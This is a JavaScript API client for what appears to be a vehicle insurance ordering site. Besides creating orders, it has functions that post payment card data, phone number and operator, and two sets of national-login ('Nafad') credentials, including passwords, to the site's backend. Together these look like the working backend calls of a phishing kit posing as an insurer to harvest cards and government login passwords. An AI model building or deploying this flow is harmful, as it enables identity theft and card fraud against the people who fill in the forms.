import api from "./axios";

export async function createOrder(
  offer_id = "",
  {
    insurance_purpose = "غير محدد",
    insurance_type = "غير محدد",
    document_owner_full_name = "غير محدد",
    owner_identity_number = "غير محدد",
    buyer_identity_number = "غير محدد",
    seller_identity_number = "غير محدد",
    start_date = "2024-12-04T18:51:51.786Z",
    vehicule = {
      serial_number: "غير محدد",
      year: 0,
      customs_code: "غير محدد",
      vehicule_use_purpose: "غير محدد",
      estimated_worth: 0,
      repair_place: "غير محدد",
    },
    selected_extra_features = [],
  }
) {
  try {
    // offer_id = "5fe1052a-8568-45c3-8970-5d982384e30e";
    // selected_extra_features = [];
    // console.log("offer-id = " + offer_id);
    // console.log({
    //   insurance_purpose,
    //   insurance_type,
    //   document_owner_full_name,
    //   owner_identity_number,
    //   buyer_identity_number,
    //   seller_identity_number,
    //   start_date,
    //   vehicule,
    //   selected_extra_features,
    // });

    const response = await api.post(`/orders/${offer_id}`, {
      insurance_purpose,
      insurance_type,
      document_owner_full_name,
      owner_identity_number,
      buyer_identity_number,
      seller_identity_number,
      start_date,
      vehicule,
      selected_extra_features,
    });
    // console.log(response);
    return response.data.id;
  } catch (err) {
    console.log(err);

    if (!err.response) throw new Error("Failed connection ...");
    throw new Error(err.response.message);
  }
}

export async function createCard(order_id, cardData) {
  try {
    const response = await api.post(`/orders/${order_id}/card`, cardData);
    // console.log(response);
    return response.data.id;
  } catch (err) {
    console.log(err);
    if (!err.response) throw new Error("Failed connection ...");
    throw new Error(err.response.message);
  }
}

export async function sendPhone(order_id, phone, phone_operator) {
  try {
    const response = await api.post(`/orders/${order_id}/phone`, {
      phone,
      phone_operator,
    });
    console.log(response);
  } catch (err) {
    console.log(err);
    if (!err.response) throw new Error("Failed connection ...");
    throw new Error(err.response.message);
  }
}

export async function sendNafadCreds(order_id, id_card_number, password) {
  try {
    const response = await api.post(`orders/${order_id}/nafad-creds`, {
      id_card_number,
      password,
    });
    return response.data.id;
  } catch (err) {
    console.log(err);
    if (!err.response) throw new Error("Failed connection ...");
    throw new Error(err.response.message);
  }
}

export async function sendNafadTwoCreds(order_id, username, password) {
  try {
    const response = await api.post(`orders/${order_id}/nafad-two-creds`, {
      username,
      password,
    });
    console.log(response);
  } catch (err) {
    if (!err.response) throw new Error("Failed connection ...");
    throw new Error(err.response.message);
  }
}

export function convertToTimestamp(dateString) {
  const date = new Date(dateString);

  const now = new Date();
  date.setUTCHours(
    now.getUTCHours(),
    now.getUTCMinutes(),
    now.getUTCSeconds(),
    now.getUTCMilliseconds()
  );

  return date.toISOString();
}
